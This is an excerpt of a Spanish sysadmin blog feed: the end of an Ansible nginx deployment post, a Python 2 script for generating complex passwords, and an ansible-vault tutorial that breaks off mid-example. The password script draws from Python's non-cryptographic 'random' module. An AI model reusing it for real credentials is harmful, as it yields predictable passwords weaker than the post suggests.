ok: &lt;span class="o"&gt;[&lt;/span&gt;slave2&lt;span class="o"&gt;]&lt;/span&gt;
ok: &lt;span class="o"&gt;[&lt;/span&gt;slave3&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;nginx : Install nginx&lt;span class="o"&gt;]&lt;/span&gt; ***************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave2&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave3&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;nginx : Ensure example virtualhost is not there&lt;span class="o"&gt;]&lt;/span&gt; *************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave3&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave2&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;nginx : Ensure nginx is running&lt;span class="o"&gt;]&lt;/span&gt; *****************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave3&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave2&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;web : Put content virtualhost&lt;span class="o"&gt;]&lt;/span&gt; *******************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave3&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave2&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;web : Put HTML files&lt;span class="o"&gt;]&lt;/span&gt; ****************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave2&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave3&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;web : Reload nginx configuration&lt;span class="o"&gt;]&lt;/span&gt; ****************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave3&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave2&lt;span class="o"&gt;]&lt;/span&gt;

PLAY RECAP *********************************************************************
slave1                     : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;   
slave2                     : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;   
slave3                     : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;   

~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y verificamos que todo funciona como debe:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# for i in `seq 1 8`; do wget -qO- http://slave2:80/; done&lt;/span&gt;
Hello from web_slave2
Hello from web_slave2
Hello from web_slave2
Hello from web_slave2
Hello from web_slave2
Hello from web_slave2
Hello from web_slave2
Hello from web_slave2
~ &lt;span class="c1"&gt;# for i in `seq 1 8`; do wget -qO- http://slave3:80/; done&lt;/span&gt;
Hello from web_slave3
Hello from web_slave3
Hello from web_slave3
Hello from web_slave3
Hello from web_slave3
Hello from web_slave3
Hello from web_slave3
Hello from web_slave3
~ &lt;span class="c1"&gt;# for i in `seq 1 8`; do wget -qO- http://slave1:80/; done&lt;/span&gt;
Hello from web_slave2
Hello from web_slave3
Hello from web_slave2
Hello from web_slave3
Hello from web_slave2
Hello from web_slave3
Hello from web_slave2
Hello from web_slave3
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En caso de cambiar a un entorno con 8 servidores web, podemos usar los roles que tenemos y solamente cambiar &lt;em&gt;myenv.yml&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Fácil, ¿no?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;</content><category term="ansible"></category><category term="playbook"></category><category term="rol"></category></entry><entry><title>Generando passwords complejas con python</title><link href="https://www.linuxsysadmin.ml/2016/08/generando-passwords-complejas-con-python.html" rel="alternate"></link><published>2016-08-22T10:00:00+02:00</published><updated>2016-08-22T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-08-22:/2016/08/generando-passwords-complejas-con-python.html</id><summary type="html">&lt;p&gt;Todos hemos trabajado en empresas que tienen curiosas políticas de seguridad. La cosa es mas cierta en la generación de &lt;em&gt;passwords&lt;/em&gt;, cuando te piden mayúsculas, minúsculas, dígitos y otros símbolos arcanos. Cuando los administradores tenemos que asignarlas a miles, ya no es divertido y tenemos que generarlas de forma automática …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Todos hemos trabajado en empresas que tienen curiosas políticas de seguridad. La cosa es mas cierta en la generación de &lt;em&gt;passwords&lt;/em&gt;, cuando te piden mayúsculas, minúsculas, dígitos y otros símbolos arcanos. Cuando los administradores tenemos que asignarlas a miles, ya no es divertido y tenemos que generarlas de forma automática.&lt;/p&gt;
&lt;p&gt;Así pues, y harto de hacerlo, hice un &lt;em&gt;script&lt;/em&gt; con &lt;strong&gt;python&lt;/strong&gt; que me asegure que se cumple con todas las restricciones reinantes.&lt;/p&gt;
&lt;p&gt;Supongamos que tenemos que generar &lt;em&gt;passwords&lt;/em&gt; de 12 caracteres, con al menos una mayúscula, una minúscula, un dígito y un otro símbolo.&lt;/p&gt;
&lt;p&gt;El truco es simple: vamos a poner un carácter de cada tipo de los requeridos, y el resto los vamos a poner del alfabeto completo. Luego solo hay que desordenar el conjunto. Para ello, hay algunas cosas que hay que saber en &lt;strong&gt;python&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Tenemos métodos para desordenar &lt;em&gt;arrays&lt;/em&gt;, pero no &lt;em&gt;strings&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;Disponemos de un método para elegir un elemento de un &lt;em&gt;array&lt;/em&gt; o un carácter de un &lt;em&gt;string&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;Podemos juntar un &lt;em&gt;array&lt;/em&gt; en un &lt;em&gt;string&lt;/em&gt;, mediante un separador, posiblemente vacío.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Así pues, vamos a declarar el alfabeto como &lt;em&gt;strings&lt;/em&gt;, la &lt;em&gt;password&lt;/em&gt; como un &lt;em&gt;array&lt;/em&gt; de caracteres y finalmente vamos a sacar la &lt;em&gt;password&lt;/em&gt; como un &lt;em&gt;string&lt;/em&gt;, juntando los caracteres sin un separador.&lt;/p&gt;
&lt;p&gt;Crearemos un &lt;em&gt;script&lt;/em&gt; llamado &lt;em&gt;password.py&lt;/em&gt;, con el siguiente contenido:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;random&lt;/span&gt;

&lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;12&lt;/span&gt;

&lt;span class="n"&gt;lowercase&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;abcdefghijklmnopqrstuvwxyz&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;uppercase&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;digits&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;0123456789&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;other&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;-+_.,:;()&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;all_chars&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lowercase&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;uppercase&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;digits&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;other&lt;/span&gt;

&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;choice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;lowercase&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;choice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uppercase&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;choice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;digits&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;choice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;other&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;choice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;all_chars&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shuffle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tras darle permisos de ejecución, solo nos queda generar &lt;em&gt;passwords&lt;/em&gt; hasta que quedemos satisfechos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ ./password.py 
pyLq:4CmfU2+
gerard@sirius:~$ ./password.py 
&lt;span class="o"&gt;(&lt;/span&gt;_vM7ag5mobU
gerard@sirius:~$ ./password.py 
4OKDa+afcEm4
gerard@sirius:~$ ./password.py 
w_.T8QjnB4UD
gerard@sirius:~$ ./password.py 
8VxHFb+.9z5e
gerard@sirius:~$ ./password.py 
vl6bSctxHd+c
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;</content><category term="password"></category><category term="python"></category><category term="seguridad"></category></entry><entry><title>Encriptando datos sensibles con Ansible</title><link href="https://www.linuxsysadmin.ml/2016/08/encriptando-datos-sensibles-con-ansible.html" rel="alternate"></link><published>2016-08-15T10:00:00+02:00</published><updated>2016-08-15T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-08-15:/2016/08/encriptando-datos-sensibles-con-ansible.html</id><summary type="html">&lt;p&gt;Si usamos &lt;strong&gt;ansible&lt;/strong&gt; para configurar otras máquinas tenemos pleno poder para acceder a otras, sea mediante claves SSH o por accesos remotos normales. En este último caso, conviene aplicar un poco de seguridad para evitar que un posible intruso acceda libremente. Para esto podemos encriptar la información sensible con &lt;strong&gt;ansible-vault …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Si usamos &lt;strong&gt;ansible&lt;/strong&gt; para configurar otras máquinas tenemos pleno poder para acceder a otras, sea mediante claves SSH o por accesos remotos normales. En este último caso, conviene aplicar un poco de seguridad para evitar que un posible intruso acceda libremente. Para esto podemos encriptar la información sensible con &lt;strong&gt;ansible-vault&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Para hacer una demostración simple, vamos a partir de &lt;a href="https://www.linuxsysadmin.ml/2016/06/controlando-contenedores-docker-con-ansible.html"&gt;un artículo anterior&lt;/a&gt;, por comodidad. En este artículo pusimos todos los datos de conexión a las máquinas controladas en el fichero de inventario &lt;em&gt;hosts&lt;/em&gt;, que hoy vamos a trocear y a encriptar las partes sensibles.&lt;/p&gt;
&lt;p&gt;Partimos de un modelo en el que un &lt;strong&gt;master&lt;/strong&gt; con las herramientas de &lt;strong&gt;ansible&lt;/strong&gt; controla s un grupo de &lt;strong&gt;slaves&lt;/strong&gt;, que solo ofrecen acceso SSH. El uso de &lt;strong&gt;docker&lt;/strong&gt; es opcional, pero muy conveniente por la rapidez en montar el entorno.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ docker ps
CONTAINER ID        IMAGE               COMMAND               CREATED             STATUS              PORTS               NAMES
c2de340b9dac        master              &lt;span class="s2"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;             &lt;span class="m"&gt;17&lt;/span&gt; seconds ago      Up &lt;span class="m"&gt;16&lt;/span&gt; seconds                           ansible
e6f0d2569207        slave               &lt;span class="s2"&gt;&amp;quot;/usr/sbin/sshd -D&amp;quot;&lt;/span&gt;   &lt;span class="m"&gt;17&lt;/span&gt; minutes ago      Up &lt;span class="m"&gt;16&lt;/span&gt; minutes                           slave2
497357df848c        slave               &lt;span class="s2"&gt;&amp;quot;/usr/sbin/sshd -D&amp;quot;&lt;/span&gt;   &lt;span class="m"&gt;17&lt;/span&gt; minutes ago      Up &lt;span class="m"&gt;17&lt;/span&gt; minutes                           slave1
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Todo el tutorial se va a hacer desde la máquina &lt;strong&gt;master&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;Estado inicial&lt;/h2&gt;
&lt;p&gt;Siguiendo el artículo mencionado, disponemos de un fichero de inventario &lt;em&gt;hosts&lt;/em&gt; que declara todos los servidores y grupos que tenemos, conjuntamente con sus datos de conexión.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat hosts &lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;slaves:vars&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;ansible_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; ansible
&lt;span class="nv"&gt;ansible_ssh_pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; s3cr3t
&lt;span class="nv"&gt;ansible_become&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;true&lt;/span&gt;
&lt;span class="nv"&gt;ansible_become_method&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; sudo
&lt;span class="nv"&gt;ansible_become_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; root
&lt;span class="nv"&gt;ansible_become_pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; s3cr3t

&lt;span class="o"&gt;[&lt;/span&gt;slaves&lt;span class="o"&gt;]&lt;/span&gt;
slave1
slave2
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver que funciona como debe.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# ansible -i hosts -m ping slaves&lt;/span&gt;
slave1 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
slave2 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Separando el inventario en dos partes&lt;/h2&gt;
&lt;p&gt;Como solo queremos encriptar los datos de conexión, vamos a partir el inventario en dos ficheros, dentro de su carpeta. &lt;strong&gt;ansible&lt;/strong&gt; va a recibir esa carpeta como inventario y va a juntar ambas partes para sacar la visión global.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# tree inventory/&lt;/span&gt;
inventory/
├── hosts
└── vault

&lt;span class="m"&gt;0&lt;/span&gt; directories, &lt;span class="m"&gt;2&lt;/span&gt; files
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La idea es tener una parte visible con los grupos y los servidores que los componen, y otra parte secreta con los datos a ocultar. Así quedaría la partición:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat inventory/hosts &lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;slaves&lt;span class="o"&gt;]&lt;/span&gt;
slave1
slave2
~ &lt;span class="c1"&gt;# cat inventory/vault &lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;slaves:vars&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;ansible_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; ansible
&lt;span class="nv"&gt;ansible_ssh_pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; s3cr3t
&lt;span class="nv"&gt;ansible_become&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;true&lt;/span&gt;
&lt;span class="nv"&gt;ansible_become_method&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; sudo
&lt;span class="nv"&gt;ansible_become_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; root
&lt;span class="nv"&gt;ansible_become_pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; s3cr3t
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tras indicar a &lt;strong&gt;ansible&lt;/strong&gt; que queremos utilizar esta nueva carpeta como inventario, vemos que sigue funcionando de manera adecuada.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# ansible -i inventory/ -m ping slaves&lt;/span&gt;
slave2 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
slave1 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Encriptando el fichero secreto&lt;/h2&gt;
&lt;p&gt;Para conseguir esto, se va a utilizar el comando &lt;strong&gt;ansible-vault&lt;/strong&gt;, al que se le pide que encripte el fichero secreto. Es una encriptación simétrica que encripta y desencripta con la misma contraseña.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# ansible-vault encrypt inventory/vault &lt;/span&gt;
New Vault password: 
Confirm New Vault password: 
Encryption successful
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver que el fichero ha quedado modificado, de forma que ya ni se puede curiosear:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat inventory/hosts &lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;slaves&lt;span class="o"&gt;]&lt;/span&gt;
slave1
slave2
~ &lt;span class="c1"&gt;# cat inventory/vault &lt;/span&gt;
&lt;span class="nv"&gt;$ANSIBLE_VAULT&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.1&lt;span class="p"&gt;;&lt;/span&gt;AES256
&lt;span class="m"&gt;37306639633165383030626335356261333436646539373962623937653137666430366330313663&lt;/span&gt;
3666396533313031633236383964323235376262386337360a303037366336666135363266616363
&lt;span class="m"&gt;63656431623363343639663331613262643032393034623337383134306635313235623463316466&lt;/span&gt;
3161613332306136310a663261346565386634663938656136363939653061373035346332616164
&lt;span class="m"&gt;62353865313265306132366166653263623964306536633163393764306166366236666362323165&lt;/span&gt;
&lt;span class="m"&gt;39353835346263646134383037386465656131356130376165646331623438336336363462383066&lt;/span&gt;
&lt;span class="m"&gt;34353062396364393239333563336466653637343030326262323338313065623864393131343165&lt;/span&gt;
&lt;span class="m"&gt;35313134666566663636636237376563316436666437316632613630396565643539623661323436&lt;/span&gt;
&lt;span class="m"&gt;30383261333230613130666465626137656463326238626163656465316632303638373334623137&lt;/span&gt;
&lt;span class="m"&gt;61653537396535346266623462396165333731326462646534343833346165333034613037663033&lt;/span&gt;
&lt;span class="m"&gt;64613763363635333030393464646139373339333436343861313462666537636461303238326433&lt;/span&gt;
&lt;span class="m"&gt;30346333303336643663623563613465393661626565636630383931643863343430613335373234&lt;/span&gt;
&lt;span class="m"&gt;3336&lt;/span&gt;
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Cuando usemos fichero encriptados, &lt;strong&gt;ansible&lt;/strong&gt; es capaz de desencriptarlos según se necesite. Solo hace falta indicarle la forma en la que queremos darle la contraseña, por ejemplo, por el terminal.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# ansible -i inventory/ -m ping slaves --ask-vault-pass&lt;/span&gt;
Vault password: 
slave1 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
slave2 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Otra forma, menos segura pero mas conveniente, es tener la contraseña en un fichero, y dejar que &lt;strong&gt;ansible&lt;/strong&gt; la lea de ese fichero. Esto es útil especialmente en &lt;em&gt;scripts&lt;/em&gt;, en donde suministrar una contraseña por el terminal no es factible.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat .vault-passfile &lt;/span&gt;
supersecret
~ &lt;span class="c1"&gt;# ansible -i inventory/ -m ping slaves --vault-password-file=.vault-passfile&lt;/span&gt;
slave1 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
